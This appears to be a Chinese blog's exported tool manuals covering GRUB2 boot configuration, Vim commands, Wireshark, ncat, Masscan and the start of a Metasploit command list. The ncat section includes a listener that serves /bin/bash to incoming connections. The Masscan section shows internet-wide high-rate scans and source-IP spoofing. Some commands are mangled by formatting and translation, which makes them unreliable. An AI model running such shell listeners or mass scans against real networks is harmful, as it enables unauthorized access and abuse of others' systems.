该变量不应该被修改，而应该被引用，例如用于if判断语句中。 5.7 prefix变量在grub启动的时候，grub自动将/boot/grub2目录的绝对路径赋值给该变量，使得以后可以直接从该变量所代表的目录下加载各文件或模块。 例如，可能自动设置为： set prefix = (hd0,gpt1)/boot/grub2/ 所以可以使用”$prefix/grubN.cfg”来引用/boot/grub2/grubN.cfg文件。 该变量不应该修改，且若手动设置，则必须设置正确，否则牵一发而动全身。 5.8 root变量该变量指定根设备的名称，使得后续使用从”/“开始的相对路径引用文件时将从该root变量指定的路径开始。一般该变量是grub启动的时候由grub根据prefix变量设置而来的。 例如prefix=(hd0,gpt1)/boot/grub2，则root=(hd0,gpt1)，后续就可以使用相对路径/vmlinuz-XXX表示(hd0,gpt1)/vmlinuz-XXX文件。 注意：在Linux中，从根”/“开始的路径表示绝对路径，如/etc/fstab。但grub中，从”/“开始的表示相对路径，其相对的基准是root变量设置的值，而使用”(dev_name)/“开始的路径才表示绝对路径。 一般root变量都表示/boot所在的分区，但这不是绝对的，如果设置为根文件系统所在分区，如root=(hd0,gpt2)，则后续可以使用/etc/fstab来引用”(hd0,gpt2)/etc/fstab”文件。 该变量在grub2中一般不用修改，但若修改则必须指定正确。 另外，root变量还应该于linux或linux16命令所指定的内核启动参数”root=”区分开来，内核启动参数中的”root=”的意义是固定的，其指定的是根文件系统所在分区。例如： set root=’hd0,msdos1’ linux16 /vmlinuz-3.10.0-327.el7.x86_64 root=UUID=b2a70faf-aea4-4d8e-8be8-c7109ac9c8b8 ro crashkernel=auto quiet LANG=en_US.UTF-8 initrd16 /initramfs-3.10.0-327.el7.x86_64.img 一般情况下，/boot都会单独分区，所以root变量指定的根设备和root启动参数所指定的根分区不是同一个分区，除非/boot不是单独的分区，而是在根分区下的一个目录。 6 grub配置和安装示例首先写一个grub.cfg。例如此处，在msdos磁盘上安装了两个操作系统，CentOS 7和CentOS 6。 1234567891011121314151617181920212223242526# 设置一些全局环境变量set default&#x3D;0set fallback&#x3D;1set timeout&#x3D;3# 将可能使用到的模块一次性装载完# 支持msdos的模块insmod part_msdos# 支持各种文件系统的模块insmod exfatinsmod ext2insmod xfsinsmod fatinsmod iso9660# 定义菜单menuentry &#39;CentOS 7&#39; --unrestricted &#123; search --no-floppy --fs-uuid --set&#x3D;root 367d6a77-033b-4037-bbcb-416705ead095 linux16 &#x2F;vmlinuz-3.10.0-327.el7.x86_64 root&#x3D;UUID&#x3D;b2a70faf-aea4-4d8e-8be8-c7109ac9c8b8 ro biosdevname&#x3D;0 net.ifnames&#x3D;0 quiet initrd16 &#x2F;initramfs-3.10.0-327.el7.x86_64.img&#125;menuentry &#39;CentOS 6&#39; --unrestricted &#123; search --no-floppy --fs-uuid --set&#x3D;root f5d8939c-4a04-4f47-a1bc-1b8cbabc4d32 linux16 &#x2F;vmlinuz-2.6.32-504.el6.x86_64 root&#x3D;UUID&#x3D;edb1bf15-9590-4195-aa11-6dac45c7f6f3 ro quiet initrd16 &#x2F;initramfs-2.6.32-504.el6.x86_64.img&#125; 然后执行grub安装操作。 1shell&gt; grub2-install &#x2F;dev&#x2F;sda 7 传统grub简述因为本文主要介绍grub2，所以传统的grub只简单介绍下，其实前面已经提及了很多传统grub和grub2的比较了。另外，传统grub已足够强大，足够应付一般的需求。 7.1 grub安装例如安装到/dev/sda上。 1shell&gt; grub-install &#x2F;dev&#x2F;sda 7.2 grub.conf配置12345678default&#x3D;0 # 默认启动第一个系统timeout&#x3D;5 # 等待超时时间5秒splashimage&#x3D;(hd0,0)&#x2F;grub&#x2F;splash.xpm.gz # 背景图片hiddenmenu # 隐藏菜单，若要显式，在启动时按下ESCtitle Red Hat Enterprise Linux AS (2.6.18-92.el5) # 定义操作系统的说明信息 root (hd0,0) kernel &#x2F;vmlinuz-2.6.18-92.el5 ro root＝&#x2F;dev&#x2F;sda2 rhgb quiet initrd &#x2F;initrd-2.6.18-92.el5.img 在说明配置方法之前，需要说明一个关键点，boot是否是一个独立的分区，它影响后面路径的配置。 在一个正常的操作系统中查看/boot/grub/grub.conf文件，可以在NOTICE段看到提示，说你是否拥有一个独立的boot分区？如果有则意味着kernel和initrd的路径是从/开始的而不是/boot开始的，如/vmlinuz-xxx，如果没有独立的boot分区，则kernel和initrd的路径中需要指明boot路径，例如Boot没有分区而是在/文件系统下的一个目录，则/boot/vmlinuz-xxx。 root (hd0,0)定义grub识别的根。一般定义的都是boot所在的分区，grub只能识别hd，所以这里只能使用hd，hd0表示在第一块磁盘上，hd0,0的第二个0表示boot在第一个分区上，grub2在分区的计算上是从1开始的，这是传统grub和grub2不同的地方。 kernel定义内核文件的路径和启动参数，等价于grub2的linux命令或linux16命令。首先说明参数，ro表示只读，root=/dev/sda[N]或者root=UUID=”device_uuid_num”指定根文件系统所在的分区，这是必须的参数。rhgb表示在操作系统启动过程中使用图形界面输出一些信息，将其省略可以加快启动速度，quiet表示启动操作系统时静默输出信息。再说明路径，如果是boot是独立分区的，则kernel的路径定义方式为/vmlinuz-xxx，如果没有独立分区，则指明其绝对路径，一般都是在根文件系统下的目录，所以一般为/boot/vmlinuz-xxx。 initrd定义init ramdisk的路径，路径的定义方式同kernel。除了路径之外没有任何参数。 或者使用下图的UUID的方式。 如果没有指定root=的选项，将报错“no or empty root …… dracut…kernel panic”的错误。如下图。","categories":[{"name":"工具手册","slug":"工具手册","permalink":"http://yoursite.com/categories/%E5%B7%A5%E5%85%B7%E6%89%8B%E5%86%8C/"}],"tags":[{"name":"系统引导","slug":"系统引导","permalink":"http://yoursite.com/tags/%E7%B3%BB%E7%BB%9F%E5%BC%95%E5%AF%BC/"}]},{"title":"VIM手册","slug":"VIM手册","date":"2020-02-05T16:21:49.000Z","updated":"2020-02-26T16:41:01.025Z","comments":true,"path":"2020/02/06/VIM手册/","link":"","permalink":"http://yoursite.com/2020/02/06/VIM%E6%89%8B%E5%86%8C/","excerpt":"","text":"1. vim模式#123CopyCopy正常模式（按Esc或Ctrl+[进入） 左下角显示文件名或为空插入模式（按i进入） 左下角显示--INSERT--可视模式（按v进入） 左下角显示--VISUAL-- 2. 打开文件#12345678910111213141516171819202122232425CopyCopy# 打开单个文件vim file # 同时打开多个文件vim file1 file2.. # 在vim窗口中打开一个新文件:open [file] 【举个例子】# 当前打开1.txt，做了一些编辑没保存:open! 放弃这些修改，并重新打开未修改的文件# 当前打开1.txt，做了一些编辑并保存:open 2.txt 直接退出对1.txt的编辑，直接打开2.txt编辑，省了退出:wq再重新vim 2.txt的步骤# 打开远程文件，比如ftp或者share folder:e ftp:&#x2F;&#x2F;192.168.10.76&#x2F;abc.txt:e \\qadrive\\test\\1.txt# 以只读形式打开文件，但是仍然可以使用 :wq! 写入vim -R file # 强制性关闭修改功能，无法使用 :wq! 写入vim -M file 3. 插入命令#12345678CopyCopyi 在当前位置生前插入I 在当前行首插入a 在当前位置后插入A 在当前行尾插入o 在当前行之后插入一行O 在当前行之前插入一行 4. 查找命令#最简单的查找 1234567CopyCopy&#x2F;text 查找text，按n健查找下一个，按N健查找前一个。?text 查找text，反向查找，按n健查找下一个，按N健查找前一个。vim中有一些特殊字符在查找时需要转义 .*[]^%&#x2F;?~$:set ignorecase 忽略大小写的查找:set noignorecase 不忽略大小写的查找 快速查找，不需要手打字符即可查找 12345CopyCopy* 向后（下）寻找游标所在处的单词# 向前（上）寻找游标所在处的单词以上两种查找，n,N 的继续查找命令依然可以适用 精准查找：匹配单词查找 如果文本中有 hello，helloworld，hellopython 那我使用 /hello ，这三个词都会匹配到。 有没有办法实现精准查找呢？可以使用 12CopyCopy&#x2F;hello\\&gt; 精准查找：匹配行首、行末 12345CopyCopy# hello位于行首&#x2F;^hello# world位于行末&#x2F;world$ 5. 替换命令#12345678910111213141516171819CopyCopy~ 反转游标字母大小写r&lt;字母&gt; 将当前字符替换为所写字母R&lt;字母&gt;&lt;字母&gt;... 连续替换字母cc 替换整行（就是删除当前行，并在下一行插入）cw 替换一个单词（就是删除一个单词，就进入插入模式），前提是游标处于单词第一个字母（可用b定位）C (大写C)替换至行尾（和D有所区别，D是删除（剪切）至行尾，C是删除至行位并进入插入模式）:s&#x2F;old&#x2F;new&#x2F; 用old替换new，替换当前行的第一个匹配:s&#x2F;old&#x2F;new&#x2F;g 用old替换new，替换当前行的所有匹配:%s&#x2F;old&#x2F;new&#x2F; 用old替换new，替换所有行的第一个匹配:%s&#x2F;old&#x2F;new&#x2F;g 用old替换new，替换整个文件的所有匹配:10,20 s&#x2F;^&#x2F; &#x2F;g 在第10行至第20行每行前面加四个空格，用于缩进。ddp 交换光标所在行和其下紧邻的一行。 6. 撤销与重做#12345CopyCopyu 撤销（Undo）U 撤销对整行的操作Ctrl + r 重做（Redo），即撤销的撤销。 7. 删除命令#需要说明的是，vim 其实并没有单纯的删除命令，下面你或许理解为剪切更加准确。 以字符为单位删除 123456789101112CopyCopyx 删除当前字符3x 删除当前字符3次X 删除当前字符的前一个字符。3X 删除当前光标向前三个字符dl 删除当前字符， dl&#x3D;xdh 删除前一个字符，X&#x3D;dhD 删除当前字符至行尾。D&#x3D;d$d$ 删除当前字符至行尾d^ 删除当前字符之前至行首 以单词为单位删除 12CopyCopydw 删除当前字符到单词尾daw 删除当前字符所在单词 以行为单位删除 123456789101112131415161718CopyCopydd 删除当前行dj 删除下一行dk 删除上一行dgg 删除当前行至文档首部d1G 删除当前行至文档首部dG 删除当前行至文档尾部kdgg 删除当前行之前所有行（不包括当前行）jdG 删除当前行之后所有行（不包括当前行）10d 删除当前行开始的10行。:1,10d 删除1-10行:11,$d 删除11行及以后所有的行:1,$d 删除所有行J 删除两行之间的空行，实际上是合并两行。 8. 复制粘贴#普通模式中使用y复制 12345678910CopyCopyyy 复制游标所在的整行（3yy表示复制3行）y^ 复制至行首，或y0。不含光标所在处字符。y$ 复制至行尾。含光标所在处字符。yw 复制一个单词。y2w 复制两个单词。yG 复制至文本末。y1G 复制至文本开头。 普通模式中使用p粘贴 12CopyCopyp(小写)：代表粘贴至光标后（下边，右边）P(大写)：代表粘贴至光标前（上边，左边） 9. 剪切粘贴#123456789101112CopyCopydd 其实就是剪切命令，剪切当前行ddp 剪切当前行并粘贴，可实现当前行和下一行调换位置正常模式下按v（逐字）或V（逐行）进入可视模式然后用jklh命令移动即可选择某些行或字符，再按d即可剪切ndd 剪切当前行之后的n行。利用p命令可以对剪切的内容进行粘贴:1,10d 将1-10行剪切。利用p命令可将剪切后的内容进行粘贴。:1, 10 m 20 将第1-10行移动到第20行之后。 10. 退出保存#123456789101112CopyCopy:wq 保存并退出ZZ 保存并退出:q! 强制退出并忽略所有更改:e! 放弃所有修改，并打开原来文件。ZZ 保存并退出:sav(eas) new.txt 另存为一个新文件，退出原文件的编辑且不会保存:f(ile) new.txt 新开一个文件，并不保存，退出原文件的编辑且不会保存 11. 移动命令#以字符为单位移动 1234567891011CopyCopyh 左移一个字符l 右移一个字符k 上移一个字符j 下移一个字符# 【定位字符】f和Ffx 找到光标后第一个为x的字符3fd 找到光标后第三个为d的字符F 同f，反向查找。 以行为单位移动 12345678CopyCopy# 10指代所有数字，可任意指定10h 左移10个字符10l 右移10个字符10k 上移10行10j 下移10行$ 移动到行尾 3$ 移动到下面3行的行尾 以单词为单位移动 1234CopyCopyw 向前移动一个单词（光标停在单词首部）b 向后移动一个单词e，同w，只不过是光标停在单词尾部ge 同b，光标停在单词尾部。 以句为单位移动 12CopyCopy( 移动到句首) 移动到句尾 跳转到文件的首尾 12CopyCopygg 移动到文件头。 &#x3D; [[ &#x3D;&#x3D; &#96;&#96;G 移动到文件尾。 &#x3D; ]] 其他移动方法 12CopyCopy^ 移动到本行第一个非空白字符上。0 移动到本行第一个字符上(可以是空格) 使用 具名标记 跳转，个人感觉这个很好用，因为可以跨文件。 123CopyCopy使用 ma ，可以将此处标记为 a，使用 &#39;a 进行跳转使用 :marks 可以查看所有的标记使用 :delm！可以删除所有的标记 当在查看错误日志时，正常的步骤是，vim打开文件，然后使用 shift+g 再跳转到最后一行，这里有个更简单的操作可以在打开文件时立即跳到最后一行。只要在 vim 和 文件 中间加个 + 即可。 12CopyCopyvim + you.log 举一反三，当你想打开文件立即跳转到指定行时，可以这样 12CopyCopy# 打开文件并跳转到 20 行vim you.log +20 当你使用 / 搜索定位跳转或者使用 :行号 进行精准跳转时，有时我们想返回到上一次的位置，如何实现？ 只要使用 Ctrl+o 即可返回上一次的位置。 12. 排版功能#缩进 1234567891011CopyCopy:set shiftwidth? 查看缩进值:set shiftwidth&#x3D;4 设置缩进值为4# 缩进相关 最好写到配置文件中 ~&#x2F;.vimrc:set tabstop&#x3D;4:set softtabstop&#x3D;4:set shiftwidth&#x3D;4:set expandtab&gt;&gt; 向右缩进&lt;&lt; 取消缩进 如何你要对代码进行缩进，还可以用 == 对当前行缩进，如果要对多行对待缩进，则使用 n==，这种方式要求你所编辑的文件的扩展名是被vim所识别的，比如.py文件。 排版 123CopyCopy:ce 居中:le 靠左:ri 靠右 13. 注释命令#多行注释 12345CopyCopy进入命令行模式，按ctrl + v进入 visual block模式，然后按j, 或者k选中多行，把需要注释的行标记起来按大写字母I，再插入注释符，例如&#x2F;&#x2F;按esc键就会全部注释了 取消多行注释 12345CopyCopy进入命令行模式，按ctrl + v进入 visual block模式，按字母l横向选中列的个数，例如 &#x2F;&#x2F; 需要选中2列按字母j，或者k选中注释符号按d键就可全部取消注释 复杂注释 12345678910CopyCopy:3,5 s&#x2F;^&#x2F;#&#x2F;g 注释第3-5行:3,5 s&#x2F;^#&#x2F;&#x2F;g 解除3-5行的注释:1,$ s&#x2F;^&#x2F;#&#x2F;g 注释整个文档:1,$ s&#x2F;^#&#x2F;&#x2F;g 取消注释整个文档:%s&#x2F;^&#x2F;#&#x2F;g 注释整个文档，此法更快:%s&#x2F;^#&#x2F;&#x2F;g 取消注释整个文档 14. 调整视野#123456789101112131415161718192021CopyCopy&quot;zz&quot;：命令会把当前行置为屏幕正中央，&quot;zt&quot;：命令会把当前行置于屏幕顶端&quot;zb&quot;：则把当前行置于屏幕底端.Ctrl + e 向下滚动一行Ctrl + y 向上滚动一行Ctrl + d 向下滚动半屏Ctrl + u 向上滚动半屏Ctrl + f 向下滚动一屏Ctrl + b 向上滚动一屏【跳到指定行】：两种方法可以先把行号打开:set nu 打开行号:20 跳到第20行20G 跳到第20行 15. 区域选择#12345678910111213141516CopyCopy要进行区域选择，要先进入可视模式v 以字符为单位，上下左右选择V 以行为单位，上下选择选择后可进行操作d 剪切&#x2F;删除y 复制Ctrl+v 如果当前是V(大写)模式，就变成v(小写) 如果当前是v(小写)模式，就变成普通模式。 如果当前是普通模式，就进入v(小写)模式利用这个，可以进行多行缩进。ggVG 选择全文 16. 窗口控制#新建窗口 1234567891011121314151617181920CopyCopy# 打开两个文件分属两个窗口vim -o 1.txt 2.txt# 假设现在已经打开了1.txt:sp 2.txt 开启一个横向的窗口，编辑2.txt:vsp 2.txt 开启一个竖向的窗口，编辑2.txt:split 将当前窗口再复制一个窗口出来，内容同步，游标可以不同:split 2.txt 在新窗口打开2.txt的横向窗口# 需要注意：内容同步，但是游标位置是独立的Ctrl-w s 将当前窗口分成水平窗口Ctrl-w v 将当前窗口分成竖直窗口Ctrl-w q 等同:q 结束分割出来的视窗。Ctrl-w q! 等同:q! 结束分割出来的视窗。Ctrl-w o 打开一个视窗并且隐藏之前的所有视窗 窗口切换 123456789101112131415161718CopyCopy# 特别说明：Ctrl w &lt;字母&gt; 不需要同时按Ctrl-w h 切换到左边窗口Ctrl-w l 切换到右边窗口Ctrl-w j 切换到下边窗口Ctrl-w k 切换到上边窗口# 特别说明：全屏模式下:n 切换下一个窗口:N 切换上一个窗口:bp 切换上一个窗口# 特别说明：非全屏模式:bn 切换下一个窗口，就当前位置的窗口的内容变了，其他窗口不变:bN 切换上一个窗口，就当前位置的窗口的内容变了，其他窗口不变 窗口移动 123456789CopyCopy# 特别说明：Ctrl w &lt;字母&gt; 不需要同时按Ctrl-w J 将当前视窗移至最下面Ctrl-w K 将当前视窗移最上面Ctrl-w H 将当前视窗移至最左边Ctrl-w L 将当前视窗移至最右边Ctrl-ww 按顺序切换窗口 调整尺寸 1234CopyCopy# 友情提示：键盘切记不要处于中文状态Ctrl-w + 增加窗口高度Ctrl-w - 减少窗口高度 退出窗口 123456789101112131415161718192021CopyCopy:close 关闭当前窗口:close! 强制关闭当前窗口:q 退出，不保存:q! 强制退出，不保存:x 保存退出:wq 保存退出:wq! 强制保存退出:w &lt;[路径&#x2F;]文件名&gt; 另存为:savesa &lt;[路径&#x2F;]文件名&gt; 另存为ZZ 保存并退出。:only 关闭所有窗口，只保留当前窗口(前提：其他窗口内容有改变的话都要先保存):only! 关闭所有窗口，只保留当前窗口:qall 放弃所有操作并退出:wall 保存所有，:wqall 保存所有并退出。 17. 文档加密#123456CopyCopyvim -x file_name然后输入密码：确认密码：如果不修改内容也要保存。:wq，不然密码设定不会生效。 18. 录制宏#按q键加任意字母开始录制，再按q键结束录制（这意味着vim中的宏不可嵌套），使用的时候@加宏名，比如qa。。。q录制名为a的宏，@a使用这个宏。 19. 执行命令#1234567891011121314CopyCopy# 重复前一次命令. # 执行shell命令:!command# 比如列出当前目录下文件:!ls # 执行脚本:!perl -c script.pl 检查perl脚本语法，可以不用退出vim，非常方便。:!perl script.pl 执行perl脚本，可以不用退出vim，非常方便。:suspend或Ctrl - Z 挂起vim，回到shell，按fg可以返回vim。 20. 帮助命令#123456789101112131415CopyCopy在Unix&#x2F;Linux系统上$ vimtutor# 普通模式下键盘输入vim或F1# 命令行模式下:help 显示整个帮助:help xxx 显示xxx的帮助，比如 :help i, :help CTRL-[（即Ctrl+[的帮助）。:help &#39;number&#39; Vim选项的帮助用单引号括起在Windows系统上:help tutor 21. 配置命令#显示当前设定 12345678CopyCopy:set或者:se显示所有修改过的配置:set all 显示所有的设定值:set option? 显示option的设定值:set nooption 取消当期设定值:ver 显示vim的所有信息（包括版本和参数等）# 需要注意：全屏模式下:args 查看当前打开的文件列表，当前正在编辑的文件会用[]括起来 更改设定 12345678910111213141516171819202122232425262728293031323334CopyCopy:set nu 显示行号set autoindent(ai) 设置自动缩进set autowrite(aw) 设置自动存档，默认未打开set backup(bk) 设置自动备份，默认未打开set background&#x3D;dark或light，设置背景风格set cindent(cin) 设置C语言风格缩进:set ts&#x3D;4 设置tab键转换为4个空格:set ff&#x3D;unix # 修改文件dos文件为unix:set shiftwidth? 查看缩进值:set shiftwidth&#x3D;4 设置缩进值为4:set ignorecase 忽略大小写的查找:set noignorecase 不忽略大小写的查找:set paste # insert模式下，粘贴格式不会乱掉:set ruler? 查看是否设置了ruler，在.vimrc中，使用set命令设制的选项都可以通过这个命令查看:scriptnames 查看vim脚本文件的位置，比如.vimrc文件，语法文件及plugin等。:set list 显示非打印字符，如tab，空格，行尾等。如果tab无法显示，请确定用set lcs&#x3D;tab:&gt;-命令设置了.vimrc文件，并确保你的文件中的确有tab，如果开启了expendtab，那么tab将被扩展为空格。:syntax 列出已经定义的语法项:syntax clear 清除已定义的语法规则:syntax case match 大小写敏感，int和Int将视为不同的语法元素:syntax case ignore 大小写无关，int和Int将视为相同的语法元素，并使用同样的配色方案","categories":[{"name":"工具手册","slug":"工具手册","permalink":"http://yoursite.com/categories/%E5%B7%A5%E5%85%B7%E6%89%8B%E5%86%8C/"}],"tags":[{"name":"文本处理","slug":"文本处理","permalink":"http://yoursite.com/tags/%E6%96%87%E6%9C%AC%E5%A4%84%E7%90%86/"}]},{"title":"wireshark手册","slug":"wireshark手册","date":"2020-02-04T08:40:50.000Z","updated":"2020-02-15T16:28:58.394Z","comments":true,"path":"2020/02/04/wireshark手册/","link":"","permalink":"http://yoursite.com/2020/02/04/wireshark%E6%89%8B%E5%86%8C/","excerpt":"","text":"Wireshark简介Wireshark是一款最流行和强大的开源数据包抓包与分析工具，没有之一。在SecTools安全社区里颇受欢迎，曾一度超越Metasploit、Nessus、Aircrack-ng等强悍工具。该软件在网络安全与取证分析中起到了很大作用，作为一款网络数据嗅探与协议分析器，已经成为网络运行管理、网络故障诊断、网络应用开发与调试的必用工具。 Wireshark入门客户端界面打开Wireshark后，能够看到三个区域。最上方是工具栏区域，可以开始捕获、停止捕获等操作。中间是Cpature Filter区域，能够在开始捕获前指定过滤规则。下方是可以捕获的网络设备，双击其中一个设备后就开始进行网络流量的捕获。 结果的展示主要分三个区域，最上方是请求和响应列表，每一条记录表示一次请求或响应的交互。中间是对选中的交互解析后的结果。最下方是原始的数据格式。在请求列表上方，我们可以指定 Display Filter，用于筛选已经捕获到的数据。 首选项(Edit—–&gt;Preferences)Wireshark首选项分为6个主要部分，外加1个高级选项。 Appearance(外观)：这些选项决定了Wireshark将如何显示数据。比如是否保存窗口的位置、3个主要窗口的布局、滚动条的摆放、Packet List面板中列的摆放、显示捕获数据的字体、前景色和背景色等。 Capture(捕获)：这些选项可以让你对自己捕获数据包的方式进行特殊的设定，比如你默认使用的设备、是否默认使用混杂模式、是否实时更新Packet List面板等。 Filter Expressions（过滤器表达式）：设置标准去过滤流量。 NameResolutions（名称解析）：通过这些设定，可以使Wireshark将地址（包括MAC、网络以及传输名称解析）解成更加容易分辨的名字。并且可以设定并发处理称解析的最大数目。 Protocols(协议)：调整关于捕捉和显示各种Wireshark解码数据包的功能。 statistics(统计)：关于统计功能的选项。 Advanced(高级)：在以上6个部分中没有做的设置会被归类到这里。 数据包色彩高亮wireshark通过Coloring Rules(着色规则)窗口可以轻松查看或者修改每个协议所对应的颜色。View—-&gt;Coloring Rules 配置文件可以在Help—-&gt;about Wireshark—-&gt;Folders中查看。在个性化设置那里是分全局设置和个人设置。 配置方案可以通过Edit—&gt;Configuration Profiles选项或者在屏幕右下角右键并选择Manage Profiles选项来查看配置方案列表。可以在此添加配置方案。其中每个配置方案都会存储在单独的目录中，可以非常方便的备份或者共享给其他人。 一个配置方案储存了下面的设置： Preferences 参数选项 Capture filters 捕获过滤器 Display filters 显示过滤器 Coloring rules 着色规则 Disabled protocols 已禁用的协议 Forced decodes 强制解码 Recent settings 最近设置，比如窗格大小，菜单设置和列宽。 Protocol-sepecific tables 针对特定协议的表格，如SNMP用户和自定义HTTP头。","categories":[{"name":"工具手册","slug":"工具手册","permalink":"http://yoursite.com/categories/%E5%B7%A5%E5%85%B7%E6%89%8B%E5%86%8C/"}],"tags":[{"name":"网络工具","slug":"网络工具","permalink":"http://yoursite.com/tags/%E7%BD%91%E7%BB%9C%E5%B7%A5%E5%85%B7/"}]},{"title":"NC手册","slug":"NC手册","date":"2020-02-02T02:24:46.000Z","updated":"2020-02-25T15:21:01.986Z","comments":true,"path":"2020/02/02/NC手册/","link":"","permalink":"http://yoursite.com/2020/02/02/NC%E6%89%8B%E5%86%8C/","excerpt":"","text":"常用参数-u 使用udp连接（不适用-u的话默认是使用tcp连接）-v 输出详细的连接产生的日志-n 不解析域名-l 绑定并侦听传入的连接（一般用于服务端）-c 通过/bin/sh 执行客户端参数过来的指令（通常使用方法为 -c bash）-w 设置连接超时时间–ssl 传输过程中使用ssl加密（服务端和客户端都要使用这个参数） 实例 连接目标端口 1ncat IP PORT 文件传输 12345服务端:ncat -lv 333 &gt; lybbn.txt客户端:ncat -nv 172.16.0.182 333 &lt; lybbnclient.txt 客户端使用ncat加密连接服务器 12345服务端:ncat -nvl 333 -c &#x2F;bin&#x2F;bash --ssl客户端:ncat -nv 172.16.0.182 333 --ssl 访问控制 123456789101112指定允许ip:ncat -lvp 8888 --allow 10.2.67.204指定拒绝ip:ncat -lvp 8888 --deny 10.2.67.204指定允许的网段:ncat -lvp 8888 --allow 10.2.67.0&#x2F;24ncat -lvp 8888 --allow 10.2.67.0-255允许访问的地址列表:ncat -lvp 8888 --allowfile trusted_hosts.txt设置最大连接数为5:ncat -lvp 8888 --max-conns 5","categories":[{"name":"工具手册","slug":"工具手册","permalink":"http://yoursite.com/categories/%E5%B7%A5%E5%85%B7%E6%89%8B%E5%86%8C/"}],"tags":[{"name":"网络工具","slug":"网络工具","permalink":"http://yoursite.com/tags/%E7%BD%91%E7%BB%9C%E5%B7%A5%E5%85%B7/"}]},{"title":"Masscan手册","slug":"Masscan手册","date":"2020-02-01T05:24:43.000Z","updated":"2020-02-25T15:28:27.015Z","comments":true,"path":"2020/02/01/Masscan手册/","link":"","permalink":"http://yoursite.com/2020/02/01/Masscan%E6%89%8B%E5%86%8C/","excerpt":"","text":"基本 nmap是港口扫描仪的合法王位，而今天仍然是最通用的选择。但对于纯粹的速度也有一些已经超越了它，包括scanrand，unicornscan，zmap，和现在masscan。 异步传输意味着扫描仪在发送探测器之前不必等待回复。 masscan是为了尽可能快地扫描整个互联网而创建的，根据其作者robert graham，这可以在不到6分钟内完成，每秒大约1000万个数据包。 在这个简短的教程中，我们将学习基础知识并提供一些真实的例子。 安装 无论是Linux还是MacOs，安装masscan都非常简单 Debian/Ubnutu上安装 1$ sudo apt-get install clang git gcc make libpcap-dev&#96;&#96;$ git clone https:&#x2F;&#x2F;github.com&#x2F;robertdavidgraham&#x2F;masscan&#96;&#96;$ cd masscan&#96;&#96;$ make Mac os安装 单端口扫描 扫描443端口的B类子网 1$ Masscan 10.11.0.0&#x2F;16 -p443 多端口扫描 扫描80或443端口的B类子网 1&#96;&#96;$ Masscan 10.11.0.0&#x2F;16 -p80,443 扫描一系列端口 扫描22到25端口的B类子网 1&#96;&#96;$ Masscan 10.11.0.0&#x2F;16 -p22-25 快速扫描 使用如上的的设置可以得到结果，但速度将是比较慢。正如已经讨论的那样，整体上masscan要快一点，所以让我们加快速度。 默认情况下，Masscan扫描速度为每秒100个数据包，这是相当慢的。为了增加这一点，只需提供该-rate选项并指定一个值。 扫描100个常见端口的B类子网，每秒100,000个数据包 1&#96;&#96;$ Masscan 10.11.0.0&#x2F;16 --top-ports 100 -rate 100000 你可以扫描的速度取决于很多因素，包括您的操作系统（Linux扫描扫描远远快于Windows），系统的资源，最重要的是您的带宽。为了以高速扫描非常大的网络，您需要使用百万以上的速率（-rate 1000000）。 排除目标 因为大部分的互联网可以很好地进行扫描，也可能只是出于纯粹的礼貌 – 你可能想要或需要从扫描中排除一些目标。为此，请提供–excludefile交换机以及包含要避免的范围列表的文件的名称。 扫描B类子网，但避免在exclude.txt中的 1&#96;&#96;$ Masscan 10.11.0.0&#x2F;16 --top-ports 100 --excludefile exclude.txt 结果保存 您可以使用标准的Unix重定向器将输出发送到文件： 1&#96;&#96;$ Masscan 10.11.0.0&#x2F;16 --top-ports 100 &gt; results.txt 除此之外，您还具有以下输出选项： 1&#96;&#96;-oX filename：输出到filename的XML。&#96;&#96; &#96;&#96;-oG filename：输出到filename在的grepable格式。&#96;&#96; &#96;&#96;-oJ filename：输出到filename在JSON格式。 Nmap功能 正如最初提到的，Masscan可以像nmap许多安全人员一样工作。这里有一些其他类似nmap的选项： 通过传递–nmap开关可以看到类似nmap的功能。 11. -iL filename：从文件读取输入。&#96;&#96;2. ‐‐exclude filename：在命令行中排除网络。&#96;&#96;3. ‐‐excludefile：从文件中排除网络。&#96;&#96;4. -S：欺骗源IP。&#96;&#96;5. -v interface：详细输出。&#96;&#96;6. -vv interface：非常冗长的输出。&#96;&#96;7. -e interface：使用指定的接口。&#96;&#96;8. -e interface：使用指定的接口。 快速开始 好的，这里有一些快速和功能的扫描示例，您可以开始，然后调整您的口味和要求。 我们假设你想快速扫描。 扫描web端口的网络 1&#96;&#96;$ masscan 10.11.0.0&#x2F;16 -p80,443,8080 - 达 1000000 扫描十大端口的网络 1&#96;&#96;$ masscan 10.11.0.0&#x2F;16 - top-ten- rate 1000000 扫描所有端口的网络 1&#96;&#96;$ masscan 10.11.0.0&#x2F;16 -p0-65535 - rate 1000000 扫描一个端口的互联网 我们将速度提高到每秒1000万，这将最大限度地延伸。 1&#96;&#96;$ masscan 0.0.0.0&#x2F;0 -p443 - rate 10000000 扫描所有端口的互联网 一般来说，如果您尝试这种情况，您应该预期会发生坏的和/或惊人的事情。 1&#96;&#96;$ masscan 0.0.0.0&#x2F;0 -p0-65535 -rate 10000000 结语 masscan油一个独特的功能是，您可以轻松地暂停和恢复扫描。当您按ctrl-c文件被创建时，调用paused.conf该文件具有扫描的所有设置和进度。您可以继续扫描‐‐resume paused.conf","categories":[{"name":"工具手册","slug":"工具手册","permalink":"http://yoursite.com/categories/%E5%B7%A5%E5%85%B7%E6%89%8B%E5%86%8C/"}],"tags":[{"name":"网络工具","slug":"网络工具","permalink":"http://yoursite.com/tags/%E7%BD%91%E7%BB%9C%E5%B7%A5%E5%85%B7/"}]},{"title":"Metasploit手册","slug":"Metasploit手册","date":"2020-01-28T15:25:12.000Z","updated":"2020-02-25T15:09:03.295Z","comments":true,"path":"2020/01/28/Metasploit手册/","link":"","permalink":"http://yoursite.com/2020/01/28/Metasploit%E6%89%8B%E5%86%8C/","excerpt":"","text":"msf基本命令所有命令1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374?核心命令&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;？ 帮助菜单banner 显示一个真棒metasploit横幅cd 更改当前的工作目录color 切换颜色connect 连接与主机通信exit 退出控制台get 获取特定于上下文的变量的值getg 获取全局变量的值grep grep另一个命令的输出help 帮助菜单history 显示命令历史irb 进入irb脚本模式load 加载一个框架插件quit 退出控制台route 通过会话路由流量save 保存活动的数据存储sessions 转储会话列表并显示有关会话的信息set 将特定于上下文的变量设置为一个值setg 将全局变量设置为一个值sleep 在指定的秒数内不做任何事情spool 将控制台输出写入文件以及屏幕threads 线程查看和操作后台线程unload 卸载框架插件unset 取消设置一个或多个特定于上下文的变量unsetg 